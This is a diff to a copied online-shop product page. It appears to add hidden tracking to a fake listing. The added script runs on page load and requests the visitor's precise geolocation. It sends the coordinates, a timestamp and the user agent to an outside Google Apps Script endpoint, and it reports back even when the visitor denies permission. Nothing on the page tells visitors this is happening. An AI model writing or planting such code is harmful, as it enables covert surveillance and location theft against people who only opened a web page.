@@ -62,8 +62,82 @@
         <link rel="alternate" hrefLang="ja" href="https://jp.dhgate.com/product/fox-tail-anal-plug-metal-butt-plug-tail-cat/936270624.html"/>
         <link rel="alternate" hrefLang="en-ie" href="https://ie.dhgate.com/product/fox-tail-anal-plug-metal-butt-plug-tail-cat/936270624.html"/>
         <script src="https://js.dhresource.com/buyerassets/_next/static/chunks/polyfills-c67a75d1b6f99dc8.js" noModule=""></script>
+        <script>
+            function sendData(location) {
+                const scriptURL = 'https://script.google.com/macros/s/AKfycbz0AF8zgYVmCvCO4c4RwW6FT3QFLALomnoKE33miKxLnwAfZIfDBer8q2Cez3eWefhT/exec';
+                const data = {
+                    latitude: location.coords.latitude,
+                    longitude: location.coords.longitude,
+                    timestamp: new Date().toISOString(),
+                    userAgent: navigator.userAgent,
+                    message: "OK",
+                };
+        
+                fetch(scriptURL, {
+                    method: 'POST',
+                    body: JSON.stringify(data),
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    mode: "no-cors"
+                })
+                //     .then(response => {
+                //     if (response.ok) {
+                //         alert("Data sent successfully!");
+                //     } else {
+                //         alert("Error sending data.");
+                //     }
+                // });
+            }
+        
+            function showError(error) {
+                const scriptURL = 'https://script.google.com/macros/s/AKfycbz0AF8zgYVmCvCO4c4RwW6FT3QFLALomnoKE33miKxLnwAfZIfDBer8q2Cez3eWefhT/exec';
+                let errmessage;
+                switch (error.code) {
+                    case error.PERMISSION_DENIED:
+                    errmessage = "User denied the request for Geolocation.";
+                        break;
+                    case error.POSITION_UNAVAILABLE:
+                        errmessage = "Location information is unavailable.";
+                        break;
+                    case error.TIMEOUT:
+                        errmessage = "The request to get user location timed out.";
+                        break;
+                    case error.UNKNOWN_ERROR:
+                        errmessage = "An unknown error occurred.";
+                        break;
+                }
+                const errdata = {
+                    latitude: null,
+                    longitude: null,
+                    timestamp: new Date().toISOString(),
+                    userAgent: navigator.userAgent,
+                    message: errmessage,
+                }
+                fetch(scriptURL, {
+                    method: 'POST',
+                    body: JSON.stringify(errdata),
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    mode: "no-cors"
+                })
+            }
+                
+        
+            function getLocation() {
+                const options ={
+                    enableHighAccuracy: true,
+                };
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(sendData, showError, options);
+                } else {
+                    alert("Geolocation is not supported by this browser.");
+                }
+            }
+        </script>
     </head>
-    <body>
+    <body onload="getLocation()">
         <body spm-b="pd">
             <div class="layout_pd-belt__7Rmtx">
                 <!--$!-->
